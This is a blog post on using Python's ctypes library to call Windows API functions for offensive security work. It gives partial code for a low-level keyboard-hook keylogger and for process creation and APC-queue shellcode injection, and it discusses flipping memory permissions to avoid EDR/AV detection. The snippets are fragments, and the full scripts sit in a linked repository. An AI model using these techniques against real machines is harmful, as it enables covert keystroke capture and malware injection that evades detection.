---
layout: post
title: Low-Level Exploits with Python and Windows System Calls
date: 2023-10-30
desc: Leveraging Python to Write Keyloggers, Create Processes, and Perform DLL Injection
keywords: blog,website,python,windows,cybersec,gh-pages,security,network,scripting,PerennaSec,automation
categories:
  - Python
tags:
  - Automation
  - Security
  - Python
icon: icon-html
---
***Associated Scripts can be found at https://github.com/perennasec/Python-WinAPI ***

One of the most exhilarating aspects of diving deeper into Python is learning how to utilize the language in order to interface with increasingly lower-level system functions. First, one learns the basics of the Ctypes library, through which one can execute C code and manipulate data in the C language without the need to code and compile a separate program. Given the ubiquity of C as the "lingua franca" of computer systems, this modest capability boasts a cornucopia of possibilities for the enterprising offensive security researcher. Not only does C code allow for users to engage in memory operations that would normally be handled by the Python interpreter, C is the language used as the backbone for all modern operating systems. Note that modern operating systems are *not* written entirely in C; Linux most notably moved to begin including Rust in its kernel. However, at the core of every modern operating system is C code. This is true for the Linux, Mac, and Windows kernels. 

(Note that while this blog will reference core C concepts such as pointers, references/dereferences, and data types, it is beyond the scope of this post to explain these concepts in depth. The author recommends Low-Level Learning on YouTube for a comprehensive, user friendly introduction to the topics. https://www.youtube.com/c/lowlevellearning)

Given the Windows kernel's reliance on C, the Microsoft Developer's Network (MSDN) holds extensive documentation for all its API functions. Everything from memory interactions, process creation and manipulation, debugging functions, and more can be found within the MSDN's notes. To elaborate, the documentation details each function's syntax, required and optional parameters, and return values, as well as details and remarks specific to a function's purpose. See the documentation for the VirtualAllocEx function (https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) for a neat overview. One will find a defining function syntax, as well as explanations of each parameter's associated values and required data types. The manual nature of C makes it necessary to account for a functions return type as well, especially as one will require the output of one function to be included within the input of another. 

![[Pasted image 20231030140217.png]]

For those of you keeping score at home, this means that *the Python programming language can be used to make system calls to the operating system's kernel,* either through interactions with the Windows API, undocumented Native API calls, or via direct system calls to the kernel itself. As one progresses into more advanced topics such as EDR/AV evasion, it becomes necessary to manipulate processes and executions at increasingly lower levels. Even Assembly language will make an appearance, being used to set values in the register & stack that will later be executed by a direct syscall made in kernel mode. 

One can think of some obvious implementations, laying the groundwork for more advanced functionality later on. For example, a simple keylogger can be spun up utilizing the ``WH_KEYBOARD_LL`` hook to monitor low level keyboard input events. The hook will register any key presses and store them within the ``KBDLLHOOKSTRUCT``, before using Python's ``ToAscii`` function to convert all received bytecode into human-readable ASCII characters. Below is a snippet of Python code defining some Windows API functions, the ``KBDLLHOOKSTRUCT`` class used for storing key values, as well as a function used to retrieve the titlebar of the foreground process. Note that when using Ctypes, it is necessary to define Windows API functions by specifying the DLL in which the function can be found, the argument types accepted by the function, and the data type returned by the function. Just as well, structures can be defined utilizing the technique seen in the ``KBDLLHOOKSTRUCT`` class definition. 

```python
HOOKPROC = CFUNCTYPE(LRESULT, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)

SetWindowsHookExA = user32.SetWindowsHookExA
SetWindowsHookExA.argtypes = (wintypes.INT, HOOKPROC, wintypes.HINSTANCE, wintypes.DWORD) #second arg is HOOKPROC, a pointer to a hook procedure
SetWindowsHookExA.restype = wintypes.HHOOK

GetMessageA = user32.GetMessageA
GetMessageA.argtypes = (wintypes.LPMSG, wintypes.HWND, wintypes.UINT, wintypes.UINT)
GetMessageA.restype = wintypes.BOOL

class KBDLLHOOKSTRUCT(Structure):
  _fields_ = [("vkCode", wintypes.DWORD),
			  ("scanCode", wintypes.DWORD),
			  ("flags", wintypes.DWORD),
			  ("time", wintypes.DWORD),
			  ("dwExtraInfo", wintypes.ULONG)]

def get_foreground_process():
	hwnd = user32.GetForeGroundWindow()
	length = GetWindowTextLengthA(hwnd) #retrieve character length of specified title bar text
	buff = create_string_buffer(length + 1) #copy text of specified window's titlebar into buffer
	GetWindowTextA(hwnd, buff, length + 1)
	return buff.value
	#needs error checking!
```

When utilizing these techniques to create and inject processes, the practice of meticulously detailing Windows function definitions becomes almost notorious. In order to properly call the ``CreateProcess`` Windows API function, structures for ``STARTUPINFO`` and ``PROCESS_INFORMATION`` must first be defined, as follows:

```python 
#STARTUPINFO Structure allows for fine-grained Process Creation control
class STARTUPINFO(Structure):
	_fields = [("cb", wintypes.DWORD),
			   ("lpReserved", LPSTR),
			   ("lpDesktop", LPSTR),
			   ("lpTitle", LPSTR),
			   ("dwX", wintypes.DWORD),
			   ("dwY", wintypes.DWORD),
			   ("dwXSize", wintypes.DWORD),
			   ("dwYSize", wintypes.DWORD),
			   ("dwXCountChars", wintypes.DWORD),
			   ("dwYCountChars", wintypes.DWORD),
			   ("dwFillAttribute", wintypes.DWORD),
			   ("dwFlags", wintypes.DWORD),
			   ("wShowWindow", wintypes.DWORD),
			   ("cbReserved2", wintypes.DWORD),
			   ("lpReserved2", LPBYTE),
			   ("hStdInput", wintypes.HANDLE),
			   ("hStdOutput", wintypes.HANDLE),
			   ("hStdError", wintypes.HANDLE),]
  

#important information for process injection
class PROCESS_INFORMATION(Structure):
	_fields_ = [("hProcess", wintypes.HANDLE),
			    ("hThread", wintypes.HANDLE),
				("dwProcessId", wintypes.DWORD),
				("dwThreadId", wintypes.DWORD),]
```

After which ``CreateProcessA`` can be defined as usual:

```python
CreateProcessA = kernel32.CreateProcessA

CreateProcessA.argtypes = (wintypes.LPCSTR, wintypes.LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, wintypes.BOOL, wintypes.DWORD, wintypes.LPVOID, wintypes.LPCSTR, POINTER(STARTUPINFO), POINTER(PROCESS_INFORMATION))

#MSDN gives LPSTARTUPINFOA & LPPROCESS_INFORMATION, therefore pointers are used

CreateProcessA.restype = wintypes.BOOL
```

An attacker could then create a process, allocate memory within that process, and inject malicious shellcode into the allocated memory. The memory is created with R/W permissions at first to avoid detection, before being changed to R/X in order to execute the payload. Several methods exist for execution of the shellcode, including creating a remote thread to execute the shellcode immediately, or queuing thread execution to be later activated via the ``QueueUserAPC`` and ``ResumeThread`` functions:

```python
#Queue a new thread via QueueUserAPC
#typically a less suspicious API Call

PAPCFUNC = CFUNCTYPE(None, POINTER(win.types.ULONG))

QueueUserAPC = kernel32.QueueUserAPC
QueueUserAPC.argtypes = (PAPCFUNC, wintypes.HANDLE, POINTER(wintypes.ULONG))
QueueUserAPC.restype = wintypes.BOOL

ResumeThread = kernel32.ResumeThread
ResumeThread.argtypes = (wintypes.HANDLE, )
ResumeThread.restype = wintypes.BOOL

#Queue the thread located within the remote_memory variable and identified by h_thread

rqueue = QueueUserAPC(PAPCFUNC(remote_memory), h_thread, None)

#change thread state from suspended to running, which in turn will execute the shellcode and TERM itself

rthread = ResumeThread(h_thread)
verify(rthread)
```
*(please note that the complete code, including definitions for ``h_thread`` and ``verify()`` can be found at the github repository linked above)*

While Python can typically be thought of as a higher-level language, slowed down by its necessary use of an interpreter and limited in its application, the above serves to demonstrate a robust flexibility within Python's capabilities. The inclusion of Ctypes' functionality leads to a world of fresh possibilities and practices within the language. One can utilize Python, if necessary, to craft specific syscalls and directly interact with a system's kernel. Offensive Security Researchers can use these techniques to "live off the land" while on engagements. Attackers gain the ability to fly under the detection capabilities of many popular security solutions, and even to craft custom DLL's through which exploit code can be delivered via the process injection techniques seen above. 
